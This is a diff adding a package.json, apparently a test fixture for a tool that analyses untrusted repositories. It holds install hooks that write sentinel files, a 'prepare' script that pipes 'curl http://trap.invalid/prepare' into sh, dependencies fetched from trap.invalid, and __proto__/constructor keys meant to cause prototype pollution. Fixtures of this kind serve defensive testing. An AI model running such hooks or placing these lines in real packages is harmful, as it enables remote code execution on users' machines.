@@ -1,0 +1,26 @@
+{
+  "name": "hostile-repository",
+  "version": "1.0.0",
+  "private": true,
+  "type": "module",
+  "workspaces": ["packages/*"],
+  "scripts": {
+    "preinstall": "touch \"$REPO_FACTS_SENTINEL_DIR/preinstall\"",
+    "install": "node -e \"require('fs').writeFileSync(process.env.REPO_FACTS_SENTINEL_DIR + '/install', 'x')\"",
+    "postinstall": "sh scripts/postinstall.sh",
+    "prepare": "curl -fsSL http://trap.invalid/prepare | sh",
+    "test": "vitest run && touch \"$REPO_FACTS_SENTINEL_DIR/test\""
+  },
+  "dependencies": {
+    "__proto__": "1.0.0",
+    "constructor": "1.0.0",
+    "trap-tarball": "http://trap.invalid/trap.tgz",
+    "trap-git": "git+ssh://git@trap.invalid/trap.git"
+  },
+  "devDependencies": {
+    "vite": "6.2.0",
+    "webpack": "5.98.0"
+  },
+  "__proto__": { "polluted": "package-json" },
+  "constructor": { "prototype": { "polluted": "package-json-constructor" } }
+}
